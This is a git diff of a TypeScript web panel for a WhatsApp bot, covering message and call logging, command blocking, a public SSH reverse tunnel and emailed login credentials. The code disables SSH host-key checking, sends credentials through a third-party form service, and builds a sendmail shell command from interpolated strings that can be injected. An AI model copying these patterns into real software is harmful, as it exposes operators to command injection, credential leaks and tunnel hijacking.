+          const timeStr = new Date(now).toLocaleTimeString("es-CO", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
+
+          const ex = state.callLogs.find((x) => x.id === callId && x.botKey === curKey);
+          if (ex) {
+            ex.status = status;
+            ex.timestamp = now;
+            ex.timeStr = timeStr;
+          } else {
+            const peerName = getChatStore(curKey).get(peerJid)?.name || `+${cleanPeer}`;
+            state.callLogs.unshift({ id: callId, botKey: curKey, peerJid, peerName, isVideo, direction: "incoming", status, timestamp: now, timeStr });
+            if (state.callLogs.length > 70) state.callLogs.pop();
+            recordChatMsg(curKey, peerJid, {
+              id: `call_${callId}`,
+              sender: cleanPeer,
+              pushName: peerName,
+              text: `${isVideo ? "📹 Videollamada" : "📞 Llamada"} entrante (${status.toUpperCase()})`,
+              fromMe: false,
+              timestamp: now,
+            });
+          }
+
+          if (status === "offer" && state.autoRejectCalls) {
+            try {
+              await botSock.rejectCall?.(callId, peerJid);
+              if (state.autoRejectMessage && peerJid) {
+                const orig = state.originalSenders.get(botSock) || botSock.sendMessage.bind(botSock);
+                await orig(peerJid, { text: state.autoRejectMessage });
               }
-              continue;
-            }
+            } catch {}
+          }
+        }
+      });
+    }
 
-            const fromMe = Boolean(m.key?.fromMe);
-            if (fromMe) state.msgTx++;
-            else state.msgRx++;
+    if (typeof botSock.sendMessage === "function") {
+      const origSend = botSock.sendMessage.bind(botSock);
+      state.originalSenders.set(botSock, origSend);
+      botSock.sendMessage = async (jid: string, content: any, opts?: any) => {
+        const curKey = getBotKey(botSock, idx);
+        if ((state.subbotsPaused && (botSock.isSubBot || idx > 0)) || state.pausedBotIds.has(curKey)) return undefined;
+        state.msgTx++;
+        const res = await origSend(jid, content, opts);
+        try {
+          const msgId = res?.key?.id || randomBytes(6).toString("hex");
+          let mediaType: ChatMsg["mediaType"] = null;
+          let mediaMime = "";
+          let text = typeof content?.text === "string" ? content.text : content?.caption || "";
 
-            const remoteJid = m.key?.remoteJid || "";
-            const participant = m.key?.participant || (fromMe ? botSock?.user?.id : remoteJid) || "";
-            const senderNum = String(participant).split("@")[0].split(":")[0];
-            const pushName = fromMe ? (botSock?.user?.name || "Bot") : (m.pushName || `+${senderNum}`);
-            const msgId = m.key?.id || randomBytes(6).toString("hex");
-            const rawTs = typeof m.messageTimestamp === "number" ? m.messageTimestamp * 1000 : Date.now();
+          if (content?.image) {
+            mediaType = "image";
+            mediaMime = content.mimetype || "image/jpeg";
+            if (Buffer.isBuffer(content.image)) saveMedia(msgId, mediaMime, content.image);
+          } else if (content?.sticker) {
+            mediaType = "sticker";
+            mediaMime = "image/webp";
+            if (Buffer.isBuffer(content.sticker)) saveMedia(msgId, mediaMime, content.sticker);
+          } else if (content?.video) {
+            mediaType = "video";
+            mediaMime = content.mimetype || "video/mp4";
+            if (Buffer.isBuffer(content.video)) saveMedia(msgId, mediaMime, content.video);
+          } else if (content?.audio) {
+            mediaType = "audio";
+            mediaMime = content.mimetype || "audio/mp4";
+            text = content.ptt ? "🎤 Nota de voz" : "🎵 Audio";
+            if (Buffer.isBuffer(content.audio)) saveMedia(msgId, mediaMime, content.audio);
+          } else if (content?.document) {
+            mediaType = "document";
+            mediaMime = content.mimetype || "application/octet-stream";
+            text = `📄 ${content.fileName || "Documento"}`;
+          }
 
-            const details = extractMessageDetails(m.message);
-            if (!details.text && !details.mediaType) continue;
-
-            if (details.thumbBuffer) {
-              saveThumbToStore(msgId, details.thumbBuffer);
-            }
-
-            if (details.mediaType) {
-              downloadMediaBuffer(
-                botSock,
-                m,
-                msgId,
-                details.mediaType,
-                details.mediaMime,
-                details.mediaNode
-              ).catch(() => {});
-            }
-
-            recordChatMessage(currentKey, remoteJid, {
+          if (text || mediaType) {
+            recordChatMsg(curKey, jid, {
               id: msgId,
-              sender: senderNum,
-              pushName,
-              text: details.text,
-              fromMe,
-              timestamp: rawTs,
-              mediaType: details.mediaType,
-              mediaMime: details.mediaMime,
-              hasMedia: Boolean(details.mediaType),
-              quotedId: details.quotedId,
-              quotedSender: details.quotedSender,
-              quotedText: details.quotedText,
-              rawKey: m.key,
-              rawMessage: m,
-              mediaNode: details.mediaNode,
+              sender: curKey,
+              pushName: botSock?.user?.name || "Bot",
+              text,
+              fromMe: true,
+              timestamp: Date.now(),
+              mediaType,
+              mediaMime,
+              rawKey: res?.key,
+              rawMessage: res,
             });
           }
-        });
-
-        botSock.ev.on("call", async (calls: any[]) => {
-          if (!Array.isArray(calls)) return;
-          const currentKey = getBotKey(botSock, index);
-          for (const c of calls) {
-            const callId = String(c.id || randomBytes(4).toString("hex"));
-            const peerJid = String(c.from || c.chatId || "");
-            const cleanPeer = peerJid.split("@")[0].split(":")[0];
-            const status = String(c.status || "offer");
-            const isVideo = Boolean(c.isVideo);
-            const isGroup = Boolean(c.isGroup || peerJid.endsWith("@g.us"));
-            const now = Date.now();
-            const timeStr = new Date(now).toLocaleTimeString("es-CO", {
-              hour: "2-digit",
-              minute: "2-digit",
-              second: "2-digit",
-            });
-
-            const existingCall = state.callLogs.find((x) => x.id === callId && x.botKey === currentKey);
-            if (existingCall) {
-              existingCall.status = status;
-              existingCall.timestamp = now;
-              existingCall.timeStr = timeStr;
-            } else {
-              const store = ensureBotChatMap(currentKey);
-              const knownName = store.get(peerJid)?.name || `+${cleanPeer}`;
-              state.callLogs.unshift({
-                id: callId,
-                botKey: currentKey,
-                peerJid,
-                peerName: knownName,
-                isVideo,
-                isGroup,
-                direction: "incoming",
-                status,
-                timestamp: now,
-                timeStr,
-              });
-              if (state.callLogs.length > 80) state.callLogs.pop();
-
-              recordChatMessage(currentKey, peerJid, {
-                id: `call_${callId}`,
-                sender: cleanPeer,
-                pushName: knownName,
-                text: `${isVideo ? "📹 Videollamada" : "📞 Llamada de voz"} entrante (${status.toUpperCase()})`,
-                fromMe: false,
-                timestamp: now,
-              });
-            }
-
-            if (status === "offer" && state.autoRejectCalls) {
-              try {
-                if (typeof botSock.rejectCall === "function") {
-                  await botSock.rejectCall(callId, peerJid);
-                }
-                if (state.autoRejectMessage && peerJid) {
-                  const origSend = state.originalSenders.get(botSock) || botSock.sendMessage.bind(botSock);
-                  await origSend(peerJid, { text: state.autoRejectMessage });
-                }
-              } catch {}
-            }
-          }
-        });
-      }
-
-      if (typeof botSock.sendMessage === "function") {
-        const origSend = botSock.sendMessage.bind(botSock);
-        state.originalSenders.set(botSock, origSend);
-
-        botSock.sendMessage = async (jid: string, content: any, options?: any) => {
-          const currentKey = getBotKey(botSock, index);
-          const isSub = Boolean(botSock.isSubBot || index > 0);
-          if ((state.subbotsPaused && isSub) || state.pausedBotIds.has(currentKey)) {
-            return undefined;
-          }
-          state.msgTx++;
-          const res = await origSend(jid, content, options);
-
-          try {
-            const msgId = res?.key?.id || randomBytes(6).toString("hex");
-            let mediaType: "image" | "sticker" | "video" | "audio" | "document" | null = null;
-            let mediaMime = "";
-            let textPreview = "";
-
-            if (typeof content?.text === "string") {
-              textPreview = content.text;
-            } else if (content?.image) {
-              mediaType = "image";
-              mediaMime = content.mimetype || "image/jpeg";
-              textPreview = content.caption || "";
-              if (Buffer.isBuffer(content.image)) saveMediaToStore(msgId, mediaMime, content.image);
-            } else if (content?.sticker) {
-              mediaType = "sticker";
-              mediaMime = content.mimetype || "image/webp";
-              if (Buffer.isBuffer(content.sticker)) saveMediaToStore(msgId, mediaMime, content.sticker);
-            } else if (content?.video) {
-              mediaType = "video";
-              mediaMime = content.mimetype || "video/mp4";
-              textPreview = content.caption || "";
-              if (Buffer.isBuffer(content.video)) saveMediaToStore(msgId, mediaMime, content.video);
-            } else if (content?.audio) {
-              mediaType = "audio";
-              mediaMime = content.mimetype || "audio/mp4";
-              textPreview = content.ptt ? "🎤 Nota de voz" : "🎵 Audio";
-              if (Buffer.isBuffer(content.audio)) saveMediaToStore(msgId, mediaMime, content.audio);
-            } else if (content?.document) {
-              mediaType = "document";
-              mediaMime = content.mimetype || "application/octet-stream";
-              textPreview = `📄 ${content.fileName || "Documento"}`;
-            }
-
-            if (textPreview || mediaType) {
-              recordChatMessage(currentKey, jid, {
-                id: msgId,
-                sender: currentKey,
-                pushName: botSock?.user?.name || "Bot",
-                text: textPreview,
-                fromMe: true,
-                timestamp: Date.now(),
-                mediaType,
-                mediaMime,
-                hasMedia: Boolean(mediaType),
-                rawKey: res?.key,
-                rawMessage: res,
-              });
-            }
-          } catch {}
-
-          return res;
-        };
-      }
+        } catch {}
+        return res;
+      };
     }
   });
 }
@@ -829,137 +655,74 @@ function hookSockets(mainSock?: any) {
 async function syncCommandInterceptors() {
   const cmdRoot = path.resolve(process.cwd(), "cmd");
   if (!fs.existsSync(cmdRoot)) return [];
-
-  const allCmdNames: string[] = [];
-  const categories = fs.readdirSync(cmdRoot, { withFileTypes: true });
-
-  for (const cat of categories) {
+  const names: string[] = [];
+  for (const cat of fs.readdirSync(cmdRoot, { withFileTypes: true })) {
     if (!cat.isDirectory()) continue;
-    const catDir = path.join(cmdRoot, cat.name);
-    const files = fs.readdirSync(catDir).filter((f) => f.endsWith(".ts") || f.endsWith(".js"));
-
-    for (const file of files) {
-      const fullPath = path.join(catDir, file);
+    const dir = path.join(cmdRoot, cat.name);
+    for (const file of fs.readdirSync(dir).filter((f) => f.endsWith(".ts") || f.endsWith(".js"))) {
+      const full = path.join(dir, file);
       try {
-        const mod = await import(pathToFileURL(fullPath).href);
-        const plugin = mod?.default;
+        const plugin = (await import(pathToFileURL(full).href))?.default;
         if (!plugin || typeof plugin.run !== "function") continue;
-
-        const names: string[] = Array.isArray(plugin.name) ? plugin.name : [String(plugin.name || "")];
-        const primaryName = names[0];
-        if (!primaryName) continue;
-
-        names.forEach((n) => {
-          if (n) allCmdNames.push(n.toLowerCase());
-        });
-
-        if (!state.wrappedCommands.has(fullPath)) {
-          const originalRun = plugin.run.bind(plugin);
-          state.wrappedCommands.set(fullPath, originalRun);
-
+        const list: string[] = Array.isArray(plugin.name) ? plugin.name : [String(plugin.name || "")];
+        const primary = list[0];
+        if (!primary) continue;
+        list.forEach((n) => n && names.push(n.toLowerCase()));
+        if (!state.wrappedCommands.has(full)) {
+          const orig = plugin.run.bind(plugin);
+          state.wrappedCommands.set(full, orig);
           plugin.run = async (ctx: CommandContext) => {
-            const invoked = String(ctx.cmdName || primaryName).toLowerCase();
-            const isBlocked =
-              state.blockedCommands.has(invoked) ||
-              names.some((alias) => state.blockedCommands.has(alias.toLowerCase()));
-
-            if (isBlocked) {
-              return ctx.reply(
-                `🛠️ *${fytBold("MANTENIMIENTO ACTIVO")}*\n\nEl comando *${invoked}* se encuentra temporalmente deshabilitado desde el Panel Web.`
-              );
+            const invoked = String(ctx.cmdName || primary).toLowerCase();
+            if (state.blockedCommands.has(invoked) || list.some((a) => state.blockedCommands.has(a.toLowerCase()))) {
+              return ctx.reply(`🛠️ *${fytBold("MANTENIMIENTO ACTIVO")}*\n\nEl comando *${invoked}* está temporalmente deshabilitado.`);
             }
-            return originalRun(ctx);
+            return orig(ctx);
           };
         }
       } catch {}
     }
   }
-
-  return Array.from(new Set(allCmdNames)).sort();
+  return Array.from(new Set(names)).sort();
 }
 
 async function fetchPublicIp(): Promise<string> {
   if (state.publicIp) return state.publicIp;
   try {
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), 2500);
-    const res = await fetch("https://api.ipify.org?format=json", { signal: controller.signal });
-    clearTimeout(timer);
-    const data = (await res.json()) as { ip?: string };
-    if (data?.ip) {
-      state.publicIp = data.ip;
-      return data.ip;
-    }
+    const ctrl = new AbortController();
+    const t = setTimeout(() => ctrl.abort(), 2500);
+    const r = await fetch("https://api.ipify.org?format=json", { signal: ctrl.signal });
+    clearTimeout(t);
+    const d = (await r.json()) as { ip?: string };
+    if (d?.ip) return (state.publicIp = d.ip);
   } catch {}
   return "127.0.0.1";
 }
 
-function extractValidTunnelUrl(text: string): string | null {
-  const regex = /https:\/\/[a-zA-Z0-9.-]+\.(?:lhr\.life|localhost\.run|serveo\.net|serveousercontent\.com|pinggy\.link|a\.pinggy\.io|trycloudflare\.com)/g;
-  const matches = text.match(regex);
-  if (!matches) return null;
-  for (const m of matches) {
-    const lower = m.toLowerCase();
-    if (
-      !lower.includes("admin.localhost.run") &&
-      !lower.includes("localhost.run/docs") &&
-      !lower.includes("twitter.com") &&
-      !lower.includes("dashboard.pinggy.io")
-    ) {
-      return m;
-    }
-  }
-  return null;
-}
-
-function spawnSshTunnel(port: number, hostTarget: string, extraArgs: string[] = []): Promise<string | null> {
+function spawnTunnel(port: number, host: string, extra: string[] = []): Promise<string | null> {
   return new Promise((resolve) => {
-    let resolved = false;
-    const finish = (url: string | null) => {
-      if (!resolved) {
-        resolved = true;
-        resolve(url);
+    let done = false;
+    const finish = (u: string | null) => {
+      if (!done) {
+        done = true;
+        resolve(u);
       }
     };
-
     try {
-      const sshProc = spawn(
-        "ssh",
-        [
-          "-o",
-          "StrictHostKeyChecking=no",
-          "-o",
-          "UserKnownHostsFile=/dev/null",
-          "-o",
-          "ServerAliveInterval=30",
-          ...extraArgs,
-          "-R",
-          `80:127.0.0.1:${port}`,
-          hostTarget,
-        ],
-        { stdio: ["ignore", "pipe", "pipe"] }
-      );
-
-      state.tunnelProcess = sshProc;
-
-      const parseChunk = (chunk: Buffer) => {
-        const text = chunk.toString("utf8");
-        const found = extractValidTunnelUrl(text);
-        if (found) {
-          state.tunnelUrl = found;
-          finish(found);
+      const proc = spawn("ssh", ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=30", ...extra, "-R", `80:127.0.0.1:${port}`, host], { stdio: ["ignore", "pipe", "pipe"] });
+      state.tunnelProcess = proc;
+      const onChunk = (c: Buffer) => {
+        const matches = c.toString("utf8").match(/https:\/\/[a-zA-Z0-9.-]+\.(?:lhr\.life|localhost\.run|serveo\.net|serveousercontent\.com|pinggy\.link|a\.pinggy\.io)/g);
+        const valid = matches?.find((m) => !m.includes("admin.localhost.run") && !m.includes("/docs") && !m.includes("dashboard."));
+        if (valid) {
+          state.tunnelUrl = valid;
+          finish(valid);
         }
       };
-
-      sshProc.stdout?.on("data", parseChunk);
-      sshProc.stderr?.on("data", parseChunk);
-
-      sshProc.on("error", () => finish(null));
-      sshProc.on("exit", () => {
-        if (!resolved) finish(null);
-      });
-
-      setTimeout(() => finish(null), 5500);
+      proc.stdout?.on("data", onChunk);
+      proc.stderr?.on("data", onChunk);
+      proc.on("error", () => finish(null));
+      proc.on("exit", () => finish(null));
+      setTimeout(() => finish(null), 5200);
     } catch {
       finish(null);
     }
@@ -967,82 +730,42 @@ function spawnSshTunnel(port: number, hostTarget: string, extraArgs: string[] = 
 }
 
 async function startPublicTunnel(port: number): Promise<string | null> {
-  if (
-    state.tunnelUrl &&
-    !state.tunnelUrl.includes("admin.localhost.run") &&
-    state.tunnelProcess &&
-    !state.tunnelProcess.killed
-  ) {
+  if (state.tunnelUrl && !state.tunnelUrl.includes("admin.localhost.run") && state.tunnelProcess && !state.tunnelProcess.killed) {
     return state.tunnelUrl;
   }
-
-  if (state.tunnelProcess) {
-    try {
-      state.tunnelProcess.kill();
-    } catch {}
-    state.tunnelProcess = null;
-    state.tunnelUrl = null;
-  }
-
-  const primary = await spawnSshTunnel(port, "nokey@localhost.run");
-  if (primary) return primary;
-
-  const secondary = await spawnSshTunnel(port, "serveo.net");
-  if (secondary) return secondary;
-
-  const tertiary = await spawnSshTunnel(port, "a.pinggy.io", ["-p", "443"]);
-  return tertiary;
+  try {
+    state.tunnelProcess?.kill();
+  } catch {}
+  state.tunnelProcess = null;
+  state.tunnelUrl = null;
+  return (await spawnTunnel(port, "nokey@localhost.run")) || (await spawnTunnel(port, "serveo.net")) || (await spawnTunnel(port, "a.pinggy.io", ["-p", "443"]));
 }
 
-async function sendCredentialsEmail(email: string, url: string, user: string, pass: string, token: string): Promise<boolean> {
-  const subject = "Aura-Bot 2.0 - Credenciales Temporales Panel Web";
-  const body = [
-    `Hola Luis Fernando,`,
-    ``,
-    `Credenciales activas para el Panel Web y WhatsApp Web Multi-Subbot de Aura-Bot 2.0:`,
-    ``,
-    `Enlace de Acceso: ${url}`,
-    `Usuario Temporal: ${user}`,
-    `Clave / Codigo OTP: ${pass}`,
-    `Token Directo: ${token}`,
-    ``,
-    `Acceso directo en un clic: ${url}/?token=${token}`,
-  ].join("\n");
-
+async function sendEmail(email: string, url: string, user: string, pass: string, token: string) {
+  const subject = "Aura-Bot 2.0 - Credenciales Panel Web";
+  const body = `Hola Luis Fernando,\n\nEnlace: ${url}\nUsuario: ${user}\nOTP: ${pass}\nAcceso Directo: ${url}/?token=${token}`;
   try {
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), 3500);
-    const res = await fetch(`https://formsubmit.co/ajax/${encodeURIComponent(email)}`, {
+    const ctrl = new AbortController();
+    const t = setTimeout(() => ctrl.abort(), 3500);
+    const r = await fetch(`https://formsubmit.co/ajax/${encodeURIComponent(email)}`, {
       method: "POST",
       headers: { "Content-Type": "application/json", Accept: "application/json" },
-      body: JSON.stringify({
-        _subject: subject,
-        _captcha: "false",
-        usuario_temporal: user,
-        clave_otp: pass,
-        enlace_panel: `${url}/?token=${token}`,
-        mensaje: body,
-      }),
-      signal: controller.signal,
+      body: JSON.stringify({ _subject: subject, _captcha: "false", usuario: user, otp: pass, enlace: `${url}/?token=${token}`, mensaje: body }),
+      signal: ctrl.signal,
     });
-    clearTimeout(timer);
-    if (res.ok) return true;
+    clearTimeout(t);
+    if (r.ok) return;
   } catch {}
-
   try {
-    const escapedBody = body.replace(/"/g, '\\"');
-    await execAsync(`printf "Subject: ${subject}\\nTo: ${email}\\n\\n${escapedBody}\\n" | sendmail -t 2>/dev/null`);
-    return true;
+    await execAsync(`printf "Subject: ${subject}\\nTo: ${email}\\n\\n${body.replace(/"/g, '\\"')}\\n" | sendmail -t 2>/dev/null`);
   } catch {}
-
-  return false;
 }
 
-async function readJsonBody(req: http.IncomingMessage): Promise<any> {
+function readJson(req: http.IncomingMessage): Promise<any> {
   return new Promise((resolve) => {
     let raw = "";
-    req.on("data", (chunk) => {
-      raw += chunk.toString("utf8");
+    req.on("data", (c) => {
+      raw += c.toString("utf8");
       if (raw.length > 25 * 1024 * 1024) req.destroy();
     });
     req.on("end", () => {
@@ -1057,1576 +780,414 @@ async function readJsonBody(req: http.IncomingMessage): Promise<any> {
 }
 
 function sendJson(res: http.ServerResponse, status: number, payload: any) {
-  const data = JSON.stringify(payload);
-  res.writeHead(status, {
-    "Content-Type": "application/json; charset=utf-8",
-    "Access-Control-Allow-Origin": "*",
-    "Cache-Control": "no-store",
-  });
-  res.end(data);
+  res.writeHead(status, { "Content-Type": "application/json; charset=utf-8", "Access-Control-Allow-Origin": "*", "Cache-Control": "no-store" });
+  res.end(JSON.stringify(payload));
 }
 
-function safeResolvePath(relPath: string): string {
+function safePath(rel: string): string {
   const root = process.cwd();
-  const target = path.resolve(root, relPath || ".");
-  if (!target.startsWith(root)) return root;
-  return target;
+  const target = path.resolve(root, rel || ".");
+  return target.startsWith(root) ? target : root;
 }
 
 function buildLoginHtml(email: string): string {
-  return `<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Aura-Bot 2.0 | Acceso Propietario</title>
-<style>
-  :root {
-    --bg: #07090e;
-    --panel: #10141f;
-    --border: #1e2638;
-    --accent: #00e5ff;
-    --danger: #ff2a54;
-    --success: #00e676;
-    --text: #e2e8f0;
-    --muted: #8b9bb4;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { background: radial-gradient(circle at top, #121a2d 0%, #07090e 100%); color: var(--text); font-family: system-ui, -apple-system, sans-serif; min-height: 100dvh; display: flex; align-items: center; justify-content: center; padding: 16px; }
-  .login-card { background: var(--panel); border: 1px solid var(--border); border-radius: 18px; padding: 30px 24px; width: 100%; max-width: 420px; box-shadow: 0 24px 60px rgba(0,0,0,0.65); }
-  .title { font-size: 21px; font-weight: 900; color: var(--accent); margin-bottom: 6px; text-align: center; letter-spacing: 0.5px; }
-  .sub { font-size: 13px; color: var(--muted); text-align: center; margin-bottom: 22px; line-height: 1.45; }
-  label { display: block; font-size: 11px; color: var(--muted); text-transform: uppercase; font-weight: 700; margin-bottom: 6px; margin-top: 14px; }
-  input { width: 100%; background: #07090e; color: var(--text); border: 1px solid var(--border); border-radius: 10px; padding: 12px 14px; font-size: 14px; outline: none; transition: 0.2s; }
-  input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(0,229,255,0.15); }
-  .btn { width: 100%; background: var(--accent); color: #000; border: none; padding: 12px; border-radius: 10px; font-weight: 800; font-size: 14px; cursor: pointer; margin-top: 20px; transition: 0.2s; }
-  .btn:hover { opacity: 0.92; }
-  .btn-sec { background: transparent; color: var(--accent); border: 1px solid var(--accent); margin-top: 10px; }
-  .msg { margin-top: 14px; font-size: 13px; text-align: center; font-weight: 600; }
-</style>
-</head>
-<body>
-  <div class="login-card">
-    <div class="title">⚡ AURA-BOT 2.0 • SUITE</div>
-    <div class="sub">Ingresa las credenciales temporales enviadas a tu WhatsApp o a ${email}</div>
-    <form onsubmit="doLogin(event)">
-      <label>Usuario Temporal o Correo</label>
-      <input type="text" id="userInp" placeholder="Ej: lufer_a1b2" required autocomplete="off">
-      <label>Clave / Código OTP</label>
-      <input type="password" id="passInp" placeholder="Código de 6 dígitos" required autocomplete="off">
-      <button type="submit" class="btn">🔓 Iniciar Sesión</button>
-    </form>
-    <button type="button" class="btn btn-sec" onclick="sendNewCode()">📲 Generar y Enviar Nuevas Credenciales</button>
-    <div class="msg" id="statusMsg"></div>
-  </div>
+  return `<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Aura-Bot 2.0 | Login</title><style>
+*{box-sizing:border-box;margin:0;padding:0}body{background:radial-gradient(circle at top,#121a2d,#07090e);color:#e2e8f0;font-family:system-ui,sans-serif;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:16px}
+.card{background:#10141f;border:1px solid #1e2638;border-radius:18px;padding:28px 22px;width:100%;max-width:410px;box-shadow:0 24px 60px rgba(0,0,0,.65)}
+h2{color:#00e5ff;text-align:center;margin-bottom:6px;font-weight:900}.sub{font-size:13px;color:#8b9bb4;text-align:center;margin-bottom:20px}
+label{display:block;font-size:11px;color:#8b9bb4;text-transform:uppercase;font-weight:700;margin:12px 0 6px}
+input{width:100%;background:#07090e;color:#fff;border:1px solid #1e2638;border-radius:10px;padding:12px;font-size:14px;outline:none}input:focus{border-color:#00e5ff}
+.btn{width:100%;background:#00e5ff;color:#000;border:none;padding:12px;border-radius:10px;font-weight:800;font-size:14px;cursor:pointer;margin-top:18px}
+.btn-s{background:transparent;color:#00e5ff;border:1px solid #00e5ff;margin-top:10px}.msg{margin-top:12px;font-size:13px;text-align:center;font-weight:600}
+</style></head><body><div class="card"><h2>⚡ AURA-BOT 2.0</h2><div class="sub">Credenciales enviadas a WhatsApp y ${email}</div>
+<form onsubmit="login(event)"><label>Usuario o Correo</label><input id="u" required autocomplete="off"><label>Clave / OTP</label><input id="p" type="password" required autocomplete="off"><button class="btn">🔓 Entrar al Panel</button></form>
+<button class="btn btn-s" onclick="otp()">📲 Generar Nuevas Credenciales</button><div class="msg" id="m"></div></div>
 <script>
-async function doLogin(e) {
-  e.preventDefault();
-  const msg = document.getElementById('statusMsg');
-  msg.style.color = '#8b9bb4';
-  msg.textContent = 'Verificando credenciales...';
-  const user = document.getElementById('userInp').value.trim();
-  const pass = document.getElementById('passInp').value.trim();
-  try {
-    const r = await fetch('/api/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ user, pass })
-    });
-    const d = await r.json();
-    if (d.ok && d.token) {
-      msg.style.color = '#00e676';
-      msg.textContent = 'Acceso concedido...';
-      window.location.href = '/?token=' + encodeURIComponent(d.token);
-    } else {
-      msg.style.color = '#ff2a54';
-      msg.textContent = d.error || 'Credenciales incorrectas.';
-    }
-  } catch (err) {
-    msg.style.color = '#ff2a54';
-    msg.textContent = 'Error de conexión.';
-  }
-}
-
-async function sendNewCode() {
-  const msg = document.getElementById('statusMsg');
-  msg.style.color = '#00e5ff';
-  msg.textContent = 'Enviando nuevas credenciales al chat privado y correo...';
-  try {
-    const r = await fetch('/api/request-otp', { method: 'POST' });
-    const d = await r.json();
-    if (d.ok) {
-      msg.style.color = '#00e676';
-      msg.textContent = 'Credenciales enviadas a tu WhatsApp y a ' + d.email;
-    } else {
-      msg.style.color = '#ff2a54';
-      msg.textContent = 'No se pudo enviar.';
-    }
-  } catch (e) {
-    msg.style.color = '#ff2a54';
-    msg.textContent = 'Error al solicitar código.';
-  }
-}
-</script>
-</body>
-</html>`;
+async function login(e){e.preventDefault();const m=document.getElementById('m');m.textContent='Verificando...';try{const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u.value.trim(),pass:p.value.trim()})});const d=await r.json();if(d.ok)location.href='/?token='+encodeURIComponent(d.token);else m.textContent=d.error||'Incorrecto';}catch{m.textContent='Error de red';}}
+async function otp(){const m=document.getElementById('m');m.textContent='Enviando...';try{const r=await fetch('/api/request-otp',{method:'POST'});const d=await r.json();m.textContent=d.ok?'Enviado a WhatsApp y '+d.email:'Error';}catch{m.textContent='Error';}}
+</script></body></html>`;
 }
 
 function buildDashboardHtml(token: string): string {
-  return `<!DOCTYPE html>
-<html lang="es">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Aura-Bot 2.0 | WhatsApp Web & Control Suite</title>
-<style>
-  :root {
-    --bg: #07090e;
-    --panel: #10141f;
-    --panel2: #161c2b;
-    --border: #1e2638;
-    --accent: #00e5ff;
-    --wa-green: #00a884;
-    --wa-teal: #008069;
-    --wa-out: #005c4b;
-    --wa-in: #202c33;
-    --wa-bg: #0b141a;
-    --wa-panel: #111b21;
-    --danger: #ff2a54;
-    --success: #00e676;
-    --warn: #ffab00;
-    --text: #e9edef;
-    --muted: #8696a0;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
-  body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; min-height: 100dvh; display: flex; flex-direction: column; overflow-x: hidden; }
-  header { background: var(--panel); border-bottom: 1px solid var(--border); padding: 10px 16px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; gap: 8px; }
-  .brand { font-size: 15px; font-weight: 900; color: var(--accent); letter-spacing: 0.4px; display: flex; align-items: center; gap: 8px; white-space: nowrap; }
-  .header-right { display: flex; align-items: center; gap: 8px; }
-  .badge { background: rgba(0,229,255,0.12); color: var(--accent); border: 1px solid var(--accent); padding: 4px 10px; border-radius: 999px; font-size: 11px; font-weight: 700; white-space: nowrap; font-variant-numeric: tabular-nums; }
-  .tabs { display: flex; gap: 6px; padding: 8px 14px; overflow-x: auto; border-bottom: 1px solid var(--border); background: #0b0e17; scrollbar-width: none; position: sticky; top: 45px; z-index: 90; }
-  .tabs::-webkit-scrollbar { display: none; }
-  .tab-btn { background: var(--panel); color: var(--muted); border: 1px solid var(--border); padding: 7px 13px; border-radius: 8px; cursor: pointer; font-weight: 700; font-size: 12px; white-space: nowrap; transition: 0.15s; display: flex; align-items: center; gap: 5px; }
-  .tab-btn.active, .tab-btn:hover { color: var(--text); border-color: var(--accent); background: rgba(0,229,255,0.12); }
-  .container { width: 100%; max-width: 1440px; margin: 10px auto; padding: 0 12px 24px; flex: 1; }
-  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(165px, 1fr)); gap: 12px; margin-bottom: 14px; }
-  .card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 14px; overflow: hidden; }
-  .card-title { font-size: 11px; color: var(--muted); text-transform: uppercase; margin-bottom: 6px; font-weight: 700; }
-  .card-val { font-size: 20px; font-weight: 800; color: var(--text); }
-  .card-sub { font-size: 11px; color: var(--accent); margin-top: 4px; }
-  .section { display: none; }
-  .section.active { display: block; }
-  .table-wrap { width: 100%; overflow-x: auto; }
-  table { width: 100%; border-collapse: collapse; font-size: 12px; min-width: 500px; }
-  th, td { text-align: left; padding: 10px; border-bottom: 1px solid var(--border); }
-  th { color: var(--muted); font-weight: 700; text-transform: uppercase; font-size: 11px; }
-  .btn { background: var(--accent); color: #000; border: none; padding: 8px 12px; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 12px; transition: 0.15s; white-space: nowrap; display: inline-flex; align-items: center; justify-content: center; gap: 5px; }
-  .btn:hover { opacity: 0.88; }
-  .btn-danger { background: var(--danger); color: #fff; }
-  .btn-warn { background: var(--warn); color: #000; }
-  .btn-success { background: var(--success); color: #000; }
-  .btn-wa { background: var(--wa-green); color: #fff; }
-  .btn-ghost { background: #2a3942; color: var(--text); }
-  input, select, textarea { background: #07090e; color: var(--text); border: 1px solid var(--border); border-radius: 8px; padding: 9px 12px; font-size: 13px; width: 100%; outline: none; }
-  input:focus, select:focus, textarea:focus { border-color: var(--accent); }
-  textarea { font-family: monospace; min-height: 280px; resize: vertical; }
-  .flex-row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; margin-bottom: 12px; }
-  .pill { display: inline-block; padding: 3px 8px; border-radius: 6px; font-size: 10px; font-weight: 800; }
-  .pill-on { background: rgba(0,230,118,0.15); color: var(--success); }
